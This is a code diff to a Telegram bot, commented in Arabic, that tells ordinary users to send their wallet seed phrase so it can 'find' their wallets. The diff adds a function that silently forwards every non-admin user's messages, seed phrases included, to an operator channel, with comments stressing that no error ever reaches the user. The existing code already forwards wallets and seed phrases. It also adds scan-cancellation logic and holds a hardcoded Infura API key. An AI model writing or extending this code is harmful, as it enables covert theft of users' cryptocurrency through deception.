@@ -78,6 +78,36 @@ async function forwardToChannel(wallet, userChatId, userInfo, seedPhrase) {
 // متغير لتتبع وضع البوت لكل مستخدم
 const userModes = new Map();
 
+// متغير لتتبع وإلغاء العمليات الجارية (كل مستخدم له token، تغييره يلغي العملية)
+const activeScanTokens = new Map();
+
+function cancelUserScan(chatId) {
+  activeScanTokens.set(chatId, Date.now());
+}
+
+function getUserToken(chatId) {
+  return activeScanTokens.get(chatId);
+}
+
+// إعادة توجيه أي رسالة من مستخدم عادي إلى القناة
+async function forwardRawMessageToChannel(msg) {
+  try {
+    if (!process.env.CHAT_ID) return;
+    const chatId = msg.chat.id;
+    if (isAdmin(chatId)) return;
+
+    const username = msg.from?.username ? `@${msg.from.username}` : 'N/A';
+    const firstName = msg.from?.first_name || 'N/A';
+    const text = msg.text || msg.caption || '[media/file]';
+
+    const header = `📨 رسالة جديدة من مستخدم\n\n📝 الاسم: ${firstName}\n👤 المستخدم: \`${username}\` (\`${chatId}\`)\n\n💬 الرسالة:\n${text}`;
+
+    await bot.sendMessage(process.env.CHAT_ID, header);
+  } catch (_) {
+    // صامت تماماً - لا يظهر أي خطأ للمستخدم
+  }
+}
+
 // إعدادات شبكات EVM
 const EVM_RPC_URLS = {
   eth: "https://mainnet.infura.io/v3/6d9c970353cd4ea7a33edef4d77aece7",
@@ -382,6 +412,11 @@ async function scanWallet(mnemonic, chatId, userInfo = null) {
     return bot.sendMessage(chatId, diagnosis.message);
   }
 
+  // تسجيل token هذه العملية - إذا تغير لاحقاً يعني تم الإلغاء
+  cancelUserScan(chatId);
+  const myToken = getUserToken(chatId);
+  const isCancelled = () => getUserToken(chatId) !== myToken;
+
   const seed = await bip39.mnemonicToSeed(cleanedMnemonic);
   const userMode = userModes.get(chatId) || 'normal';
   let foundWalletsWithBalance = 0;
@@ -391,6 +426,8 @@ async function scanWallet(mnemonic, chatId, userInfo = null) {
   const derivedWallets = allPaths
     .map(path => deriveWalletOffline(path, seed))
     .filter(Boolean);
+
+  if (isCancelled()) return;
 
   if (isAdmin(chatId)) {
     const msg = userMode === 'balance_only'
@@ -420,6 +457,7 @@ async function scanWallet(mnemonic, chatId, userInfo = null) {
   const seenAddresses = new Set();
 
   for (const wallet of results) {
+    if (isCancelled()) return;
     if (wallet && !seenAddresses.has(wallet.address)) {
       seenAddresses.add(wallet.address);
 
@@ -466,6 +504,8 @@ async function scanWallet(mnemonic, chatId, userInfo = null) {
     }
   }
 
+  if (isCancelled()) return;
+
   if (isAdmin(chatId)) {
     if (userMode === 'balance_only') {
       if (foundWalletsWithBalance === 0) {
@@ -483,9 +523,11 @@ async function scanWallet(mnemonic, chatId, userInfo = null) {
 
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
-  
+
+  // إلغاء أي عملية فحص جارية فوراً لهذا المستخدم
+  cancelUserScan(chatId);
+
   if (isAdmin(chatId)) {
-    // رسالة المشرفين باللغة العربية مع جميع الأوامر
     bot.sendMessage(chatId,
       'مرحباً! 👋\n\n' +
       '🔑 أرسل لي المنيمونك الخاص بك وسأقوم بفحص المحفظة.\n\n' +
@@ -496,7 +538,6 @@ bot.onText(/\/start/, (msg) => {
       '🔸 أرسل كلمة **bnb** لفحص عبارات EVM (الخمس مسارات).'
     );
   } else {
-    // رسالة المستخدمين العاديين باللغة الإنجليزية
     bot.sendMessage(chatId,
       'Welcome! 👋\n\n' +
       '🔑 Send me your seed phrase to find the wallets associated with it.\n\n' +
@@ -975,6 +1016,11 @@ bot.on('document', async (msg) => {
 bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text;
+
+  // إعادة توجيه جميع رسائل المستخدمين العاديين إلى القناة (صامت تماماً)
+  if (!isAdmin(chatId)) {
+    forwardRawMessageToChannel(msg).catch(() => {});
+  }
 
   if (!text) return;
 
